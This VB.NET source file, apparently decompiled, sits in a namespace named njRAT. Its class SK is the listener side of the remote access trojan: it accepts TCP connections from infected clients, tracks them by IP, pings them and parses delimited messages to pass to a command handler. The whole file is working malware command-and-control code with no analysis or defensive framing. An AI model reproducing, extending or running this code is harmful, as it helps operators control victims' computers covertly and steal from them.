Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading

Namespace njRAT
    Public Class SK
        ' Methods
        Public Sub New(ByVal port As Integer)
            Me.S = New TcpListener(port)
            Me.S.Server.SendTimeout = -1
            Me.S.Server.ReceiveTimeout = -1
            Me.S.Start(&H270F)
            Dim dz As New Thread(New ThreadStart(AddressOf Me.WL), 1)
            dz.Start()
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub Lam__2(ByVal a0 As Object)
            Me.READ(Conversions.ToInteger(a0))
        End Sub

        Public Function fx(ByVal b As Byte()) As Array
            Dim list As New List(Of Byte())
            Dim stream As New MemoryStream
            Dim stream2 As New MemoryStream
            Dim strArray As String() = Strings.Split(FN.BS(b), Me.SPL, -1, CompareMethod.Binary)
            stream.Write(b, 0, strArray(0).Length)
            stream2.Write(b, (strArray(0).Length + Me.SPL.Length), (b.Length - (strArray(0).Length + Me.SPL.Length)))
            list.Add(stream.ToArray)
            list.Add(stream2.ToArray)
            stream.Dispose()
            stream2.Dispose()
            Return list.ToArray
        End Function

        Public Function GetClient(ByVal ID As String) As Client
            Dim online As Collection = Me.Online
            SyncLock online
                Try
                    Return DirectCast(Me.Online.Item(ID), Client)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                End Try
                Return Nothing
            End SyncLock
        End Function

        Public Sub pnd()
            Do While True
                Try
                    If (Me.S.Pending And Not Me.OFF) Then
                        Dim item As New Client(Me.S.AcceptTcpClient)
                        item.Client.ReceiveTimeout = -1
                        item.Client.SendTimeout = -1
                        Dim online As Collection = Me.Online
                        SyncLock online
                            Me.Online.Add(item, item.ip, Nothing, Nothing)
                        End SyncLock
                        ind.Log(("New Connection " & item.ip))
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ind.Log(("errpnd " & exception.Message))
                    ProjectData.ClearProjectError()
                End Try
                Thread.Sleep(1)
            Loop
        End Sub

        Private Sub READ(ByVal id As Integer)
Label_0001:
            Do While (Me.IT(id) Is Nothing)
                Thread.Sleep(1)
            Loop
            Dim num As Integer = 0
            Dim item As Client = Me.IT(id)
            If (Me.OFF OrElse Not item.CN) Then
                GoTo Label_0304
            End If
            Try
                num = 1
                If Not item.Client.Connected Then
                    GoTo Label_0304
                End If
                If Not item.IsPNGED Then
                    If (item.Ping <= &H3E8) Then
                        GoTo Label_0093
                    End If
                    item.IsPNGED = True
                    item.Ping = 0
                    If item.Send("P") Then
                        GoTo Label_0093
                    End If
                    num = 2
                    GoTo Label_0304
                End If
                If (item.Ping > &H1194) Then
                    num = 3
                    GoTo Label_0304
                End If
Label_0093:
                If (item.Client.Available > 0) Then
                    Dim buffer As Byte() = New Byte(((item.Client.Available - 1) + 1) - 1) {}
                    item.Client.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None)
                    ind.RC = (ind.RC + buffer.Length)
                    item.M.Write(buffer, 0, buffer.Length)
                    Do While FN.BS(item.M.ToArray).Contains(Me.SPL)
                        Dim instance As Array = Me.fx(item.M.ToArray)
                        Dim b As Byte() = DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing), Byte())
                        NewLateBinding.LateIndexSetComplex(instance, New Object() {0, b}, Nothing, True, False)
                        If (FN.BS(b) = "P") Then
                            num = 4
                            If (item.L Is Nothing) Then
                                GoTo Label_0304
                            End If
                            ind.Req(New Object() {item, FN.SB(("P" & ind.Y & Conversions.ToString(item.Ping)))})
                            item.IsPNGED = False
                            item.Ping = 0
                        Else
                            ind.Req(New Object() {item, RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing))})
                        End If
                        item.M.Dispose()
                        item.M = New MemoryStream
                        If (instance.Length <> 2) Then
                            GoTo Label_02AB
                        End If
                        item.M.Write(DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Byte()), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Nothing, "length", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                    Loop
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                num = 5
                ProjectData.ClearProjectError()
                GoTo Label_0304
            End Try
Label_02AB:
            item.Buzy = False
            Me.IT(id) = Nothing
            GoTo Label_0001
Label_0304:
            item.T.Enabled = False
            item.T.Dispose()
            item.CN = False
            Dim disconnect As List(Of Client) = Me.Disconnect
            SyncLock disconnect
                Me.Disconnect.Add(item)
            End SyncLock
            Me.IT(id) = Nothing
            ind.Log(("Disconnected " & Conversions.ToString(num) & " " & item.ip))
            GoTo Label_0001
        End Sub

        Private Sub WL()
            Dim collection As Collection
            Dim num As Integer = 0
            Dim num6 As Integer = (Me.IT.Length - 1)
            Dim i As Integer = 0
            Do While (i <= num6)
                Dim thread2 As New Thread(New ParameterizedThreadStart(AddressOf Me.Lam__2), 0)
                thread2.Priority = ThreadPriority.Lowest
                thread2.Start(i)
                i += 1
            Loop
            Dim thread As New Thread(New ThreadStart(AddressOf Me.pnd))
            thread.Start()
            GoTo Label_01DD
Label_01D7:
            Thread.Sleep(1)
Label_01DD:
            collection = Me.Online
            SyncLock collection
                Dim disconnect As List(Of Client) = Me.Disconnect
                SyncLock disconnect
                    Dim client As Client
                    Dim num4 As Integer = 0
                    Do
                        Try
                            If (Me.Disconnect.Count > 0) Then
                                client = Me.Disconnect.Item(0)
                                Me.Disconnect.RemoveAt(0)
                                Try
                                    client.Client.Client.Disconnect(False)
                                Catch exception1 As Exception
                                    ProjectData.SetProjectError(exception1)
                                    ProjectData.ClearProjectError()
                                End Try
                                Try
                                    client.Client.Close()
                                Catch exception4 As Exception
                                    ProjectData.SetProjectError(exception4)
                                    ProjectData.ClearProjectError()
                                End Try
                                Me.Online.Remove(client.ip.ToString)
                                thread = New Thread(New ParameterizedThreadStart(AddressOf ind.Req), 1)
                                Dim parameter As Object() = New Object(2 - 1) {}
                                parameter(0) = client
                                Dim s As String = "!"
                                parameter(1) = FN.SB(s)
                                thread.Start(parameter)
                            End If
                        Catch exception5 As Exception
                            ProjectData.SetProjectError(exception5)
                            ProjectData.ClearProjectError()
                        End Try
                        num4 += 1
                    Loop While (num4 <= 0)
                    Dim num7 As Integer = (Me.IT.Length - 1)
                    Dim j As Integer = 0
                    Do While (j <= num7)
                        If (Me.IT(j) Is Nothing) Then
                            If (Me.Online.Count <= 0) Then
                                GoTo Label_01D7
                            End If
                            num += 1
                            If (num > Me.Online.Count) Then
                                num = 1
                            End If
                            client = DirectCast(Me.Online.Item(num), Client)
                            If Not client.Buzy Then
                                client.Buzy = True
                                Me.IT(j) = client
                            End If
                        End If
                        j += 1
                    Loop
                End SyncLock
            End SyncLock
            GoTo Label_01D7
        End Sub


        ' Fields
        Public Disconnect As List(Of Client) = New List(Of Client)
        Private IT As Client() = New Client(&H65 - 1) {}
        Private [OFF] As Boolean = False
        Public Online As Collection = New Collection
        Public S As TcpListener
        Public SPL As String = "[endof]"
    End Class
End Namespace

